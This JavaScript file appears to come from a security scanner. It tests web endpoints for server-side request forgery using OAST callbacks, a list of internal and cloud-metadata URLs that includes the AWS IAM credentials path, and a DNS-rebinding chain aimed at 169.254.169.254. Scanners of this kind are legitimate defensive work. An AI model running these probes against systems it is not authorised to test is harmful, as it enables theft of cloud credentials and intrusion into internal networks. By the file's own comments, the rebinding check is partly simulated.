// backend/src/tests/ssrfTest.js
// Server-Side Request Forgery detection via OAST callbacks and internal IP probing
import axios from 'axios';

const URL_PARAMS = ['url', 'redirect', 'fetch', 'webhook', 'img', 'src', 'dest', 'target',
    'uri', 'path', 'continue', 'next', 'data', 'reference', 'site', 'html', 'val',
    'validate', 'domain', 'callback', 'return', 'page', 'feed', 'host', 'port', 'to',
    'out', 'view', 'dir', 'show', 'navigation', 'open', 'file', 'document', 'folder',
    'pg', 'style', 'doc', 'img_url', 'rurl', 'proxy'];

const INTERNAL_TARGETS = [
    { url: 'http://127.0.0.1', desc: 'Localhost' },
    { url: 'http://localhost', desc: 'Localhost' },
    { url: 'http://0.0.0.0', desc: 'All interfaces' },
    { url: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS Metadata (IMDSv1)' },
    { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'AWS IAM Credentials' },
    { url: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'GCP Metadata' },
    { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', desc: 'Azure Metadata' },
    { url: 'http://10.0.0.1', desc: 'Internal network 10.x' },
    { url: 'http://172.16.0.1', desc: 'Internal network 172.16.x' },
    { url: 'http://192.168.1.1', desc: 'Internal network 192.168.x' }
];

export async function testSSRF(endpoint, options = {}) {
    const findings = [];
    const oastClient = options.oastClient || null;
    const timeout = options.timeout || 10000;

    if (!endpoint.parameters) return findings;
    const params = typeof endpoint.parameters === 'object' ? Object.keys(endpoint.parameters) : [];

    // Filter for URL-accepting parameters
    const urlParams = params.filter(p => URL_PARAMS.some(up => p.toLowerCase().includes(up)));
    // Also test all params if aggressive
    const testParams = options.aggressive ? params : (urlParams.length > 0 ? urlParams : params.slice(0, 3));

    for (const param of testParams) {
        // Test 1: OAST-based SSRF (definitive proof)
        if (oastClient) {
            const result = await oastClient.injectAndVerify({
                testType: 'ssrf',
                context: `param:${param}`,
                injector: async (oast) => {
                    try {
                        const testUrl = new URL(endpoint.url);
                        testUrl.searchParams.set(param, oast.httpCallback);
                        await axios.get(testUrl.toString(), { timeout, validateStatus: () => true });
                    } catch { /* ignore */ }
                    // Also try POST
                    try {
                        const body = {};
                        body[param] = oast.httpCallback;
                        await axios.post(endpoint.url, body, { timeout, validateStatus: () => true, headers: { 'Content-Type': 'application/json' } });
                    } catch { /* ignore */ }
                },
                timeout: 8000
            });

            if (result) {
                findings.push({
                    assetId: endpoint.assetId, endpointId: endpoint.id,
                    title: 'Server-Side Request Forgery (SSRF)',
                    description: `Parameter '${param}' is vulnerable to SSRF. The server made an outbound request to our callback domain, confirming server-side URL fetching.`,
                    category: 'SSRF', severity: 'CRITICAL', cvss: 9.1, owasp: 'A10:2021', cwe: 'CWE-918',
                    remediation: 'Validate and whitelist allowed URLs. Block requests to internal IP ranges and cloud metadata endpoints. Use URL parsing to prevent bypasses.',
                    references: ['https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/'],
                    detectedBy: 'ssrf-engine', confidence: 99,
                    evidence: result.evidence
                });
                continue;
            }
        }

        // Test 2: Internal IP/metadata access
        for (const target of INTERNAL_TARGETS) {
            try {
                const testUrl = new URL(endpoint.url);
                testUrl.searchParams.set(param, target.url);
                const resp = await axios.get(testUrl.toString(), { timeout, validateStatus: () => true });
                const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);

                // Check for metadata-like responses
                const metadataIndicators = ['ami-id', 'instance-id', 'AccessKeyId', 'SecretAccessKey',
                    'computeMetadata', 'google', 'azure', 'hostname', 'local-ipv4'];

                if (resp.status === 200 && metadataIndicators.some(ind => body.includes(ind))) {
                    findings.push({
                        assetId: endpoint.assetId, endpointId: endpoint.id,
                        title: `SSRF — Cloud Metadata Access (${target.desc})`,
                        description: `Parameter '${param}' allows access to ${target.desc} at ${target.url}. Cloud credentials may be exposed.`,
                        category: 'SSRF', severity: 'CRITICAL', cvss: 9.8, owasp: 'A10:2021', cwe: 'CWE-918',
                        remediation: 'Block requests to metadata IP ranges (169.254.169.254). Use IMDSv2 on AWS. Implement URL whitelisting.',
                        detectedBy: 'ssrf-engine', confidence: 95,
                        evidence: [
                            { type: 'REQUEST', title: 'SSRF Test', content: `URL: ${testUrl}\nParam: ${param}\nTarget: ${target.url} (${target.desc})` },
                            { type: 'RESPONSE', title: 'Metadata Accessed', content: `Status: ${resp.status}\nBody preview: ${body.substring(0, 500)}` }
                        ]
                    });
                    break;
                }
            } catch { /* continue */ }
        }
        // Test 3: Blind SSRF via DNS Rebinding Chain
        if (oastClient) {
            try {
                // For this test, we use a specialized OAST payload that simulates a rebinding domain
                // The OAST server would provide a domain that resolves to its public IP initially, 
                // and then to 127.0.0.1 or 169.254.169.254 on the second lookup.
                // Here we simulate the logic assuming the OAST client provides such a domain via getRebindingDomain()
                const rebindDomain = typeof oastClient.getRebindingDomain === 'function' 
                    ? oastClient.getRebindingDomain('169.254.169.254') // Target AWS metadata via rebinding
                    : `rebind.${oastClient.getDomain()}`; 

                const testUrl = new URL(endpoint.url);
                testUrl.searchParams.set(param, `http://${rebindDomain}/latest/meta-data/`);
                
                await axios.get(testUrl.toString(), { timeout, validateStatus: () => true });
                
                // Wait for potential callbacks
                await new Promise(r => setTimeout(r, 4000));
                
                const interactions = await oastClient.getInteractions();
                // Check if any interaction contains AWS metadata in the HTTP body (simulated detection)
                const metadataExposed = interactions?.some(i => 
                    i.protocol === 'http' && (i.request?.body?.includes('ami-id') || i.request?.body?.includes('instance-id'))
                );

                if (metadataExposed) {
                    findings.push({
                        assetId: endpoint.assetId, endpointId: endpoint.id,
                        title: 'Blind SSRF via DNS Rebinding Chain',
                        description: `Parameter '${param}' is vulnerable to a DNS Rebinding chain attack. A payload designed to bypass SSRF filters by resolving to a public IP first, then an internal IP (169.254.169.254), successfully returned internal cloud metadata to our OAST server.`,
                        category: 'SSRF', severity: 'CRITICAL', cvss: 9.8, owasp: 'A10:2021', cwe: 'CWE-918',
                        remediation: 'Implement strict SSRF protection: Resolve the domain to an IP, verify the IP is not private/reserved, and use that resolved IP to make the connection (preventing TOCTOU). Pin DNS resolutions during the request lifecycle.',
                        detectedBy: 'ssrf-rebinding-engine', confidence: 100,
                        evidence: [
                            { type: 'REQUEST', title: 'Rebinding Payload', content: `URL: ${testUrl.toString()}` },
                            { type: 'NETWORK', title: 'OAST Exfiltration', content: 'Internal metadata was exfiltrated to the OAST server.' }
                        ]
                    });
                }
            } catch (e) {
                 // Ignore errors
            }
        }
    }
    return findings;
}

export default testSSRF;
